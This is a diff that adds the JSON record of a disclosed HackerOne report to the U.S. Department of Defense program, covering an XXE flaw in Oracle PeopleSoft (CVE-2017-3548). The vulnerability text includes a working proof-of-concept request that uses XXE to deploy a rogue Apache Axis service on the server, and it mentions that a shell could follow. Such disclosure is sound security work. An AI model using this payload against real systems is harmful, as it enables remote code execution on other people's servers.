@@ -1,0 +1,118 @@
+{
+  "id": 710654,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC83MTA2NTQ=",
+  "url": "https://hackerone.com/reports/710654",
+  "title": "XXE with RCE potential on the https://█████████ (CVE-2017-3548)",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2019-10-09T18:41:26.984Z",
+  "submitted_at": "2019-10-09T18:41:26.984Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "sp1d3rs",
+    "url": "/sp1d3rs",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/079/690/6853ada3e124bdd8616b1be752223b558de38195_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1"
+    },
+    "is_me?": false,
+    "cleared": true,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 16064,
+    "url": "https://hackerone.com/deptofdefense",
+    "handle": "deptofdefense",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/016/064/46cd0286b1fa224aaa2cb9dfaaca9fa22b5b80b2_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/016/064/46cd0286b1fa224aaa2cb9dfaaca9fa22b5b80b2_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "U.S. Dept Of Defense",
+      "twitter_handle": "DC3VDP",
+      "website": "https://bit.ly/3ntULtN",
+      "about": ""
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+    "CVE-2017-3548"
+  ],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2024-07-19T14:31:50.271Z",
+  "bug_reporter_agreed_on_going_public_at": "2024-06-18T20:01:05.209Z",
+  "team_member_agreed_on_going_public_at": "2024-07-19T14:31:50.140Z",
+  "comments_closed?": true,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "##Description\nHello. I was able to identify XXE on the https://███████\nIt is CVE in Oracle PeopleSoft (CVE-2017-3548)\n\n##POC\nI determined that instance is available on localhost port 80, so it's possible to access `/pspc/services/AdminService` via XXE:\n\n```\nPOST /PSIGW/PeopleSoftServiceListeningConnector HTTP/1.1\nHost: ████████\nContent-Type: application/xml\nContent-Length: 608\n\n<!DOCTYPE a PUBLIC \"-//B/A/EN\" \"http://localhost:80/pspc/services/AdminService?method=%21--%3E%3Cns1%3Adeployment+xmlns%3D%22http%3A%2F%2Fxml.apache.org%2Faxis%2Fwsdd%2F%22+xmlns%3Ajava%3D%22http%3A%2F%2Fxml.apache.org%2Faxis%2Fwsdd%2Fproviders%2Fjava%22+xmlns%3Ans1%3D%22http%3A%2F%2Fxml.apache.org%2Faxis%2Fwsdd%2F%22%3E%3Cns1%3Aservice+name%3D%22h1testservice%22+provider%3D%22java%3ARPC%22%3E%3Cns1%3Aparameter+name%3D%22className%22+value%3D%22org.apache.pluto.portalImpl.Deploy%22%2F%3E%3Cns1%3Aparameter+name%3D%22allowedMethods%22+value%3D%22%2A%22%2F%3E%3C%2Fns1%3Aservice%3E%3C%2Fns1%3Adeployment\">\n```\nwhere `h1testservice` is test service name I'm trying to create.\n\nThe result:\n```\nhttps://██████████/pspc/services/h1testservice\n```\n█████\nI created new service on server.\n\nIt's possible to go further like other researcher did in the #227880 but I don't think that dropping shell is necessary (since it's already proved that we can create our Apache Axis service.\n\n##Suggested fix\nPatch Oracle PeopleSoft instance.\n\n## Impact\n\nRemote code execution, internal network access.",
+  "weakness": {
+    "id": 54,
+    "name": "XML External Entities (XXE)"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 9,
+  "voters": [
+    "loaymorad",
+    "m4khn0",
+    "zy9ard3",
+    "shubham_srt",
+    "iwasday",
+    "senelme",
+    "eldeeb71",
+    "aecherli",
+    "musashi_heitou251"
+  ],
+  "severity": {
+    "rating": "high",
+    "author_type": "Team"
+  },
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
